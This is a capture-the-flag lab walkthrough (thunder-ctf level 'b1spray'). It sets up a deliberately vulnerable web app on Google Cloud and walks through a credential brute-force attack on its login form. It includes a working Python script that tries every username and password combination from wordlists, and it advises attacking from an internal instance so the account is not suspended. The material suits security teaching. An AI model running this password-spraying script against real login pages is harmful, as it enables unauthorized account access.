<h3>Setup:</h3>
<p>Your virtual environment must be active to use thunder.py:</p>
<pre>source ../env-tctf/bin/activate</pre>
<pre>python3 thunder.py create websec/b1spray</pre>
<h3>Intro:</h3>
<p>Creating this level will start a vulnerable website which we can use to attack.<br/>
A list of possible user names and a list of most commonly used passwords downloaded from Internet are provided in scripts/b1.<br/>
Use attack.py or write your own code to find valid credential of the website by sending requests of all combinations of username and password.
</p>

---

<p>List the instances in the project.</p>
<pre>gcloud compute instances list</pre>
<P>You should be able to see two instances listed.
<p><b>b1-container-vm</b>: The application you will attack is running on this machine. (Take note of its EXTERNAL_IP and INTERNAL_IP)</p>
<p><b>b1-attack-instance</b>: We are going to launch attack from this instance.</p>

---
<p>Try browse website using EXTERNAL_IP in a browser </p>
<img src="../img/b1spray/login.png">
<p>Use Chrome webtool(f12) or Firefox debuggerto inspect the login form. </p>
<img src="../img/b1spray/ins.png">
<p>We can find that the name attributes of text inputs in login page are 'username' and 'password'(we will use this information in our code later). </p>
---
<p>Navigate to thunder-ctf/scripts/b1.</p>
<p>Take a look at attack.py and replace INTERNAL_IP/EXTERNAL_IP</p>
<pre>
import requests
import itertools

#possible usernames 
unames=[uname.rstrip('\n') for uname in open('unames.txt','r')]
#most commanly used passwords found online
passwords=[password.rstrip('\n').strip() for password in open('passwords.txt','r')]

#url='http://YOUR_WEB_IP/login'
url='http://10.138.0.58/login'

#iterate over all combination of user names and passwords
for u, p in itertools.product(unames,passwords):
    #prepare data for post request
    payload={'username':u,'password':p}
    #send username and password through post method to web app url
    post=requests.Session().post(url, data=payload)
    #check if respond text contains invalid credentails
    if 'Invalid credentials' not in  post.text:
        #print valid username and password
        print(u+' '+p)
</pre>
---
<p>If you want to attack from your local system which has pyhton installed. You can download scripts/b1 with the code below and use ENTERNAL_IP in your attack script</p>
<pre>cloudshell download scripts/b1/*</pre>
<p>or<br/></p>
<p>If you want to use google cloud environment and avoid your account being suspended for suspicious activity, you need to launch attack with INTERNAL_IP from another instance.<br/>
b1-attack-instance and b1-container-vm are created in the same VPC network, so they are allowed to communicate with each other via internal ips 
</p>
<p>Copy scripts/b1 from cloud shell into your attack instance </p>
<pre>gcloud compute scp --recurse scripts/b1/*  b1-attack-instance:~/</pre>
<p>SSH into your attack instance </p>
<pre>gcloud compute ssh b1-attack-instance</pre>
---
<p>Run attack script</p>
<pre>python3 attack.py</pre>
<p>You should see a set of valid credential printed in your terminal. </p>
---
<p>Try if you can login with printed credential in a web browser </p>
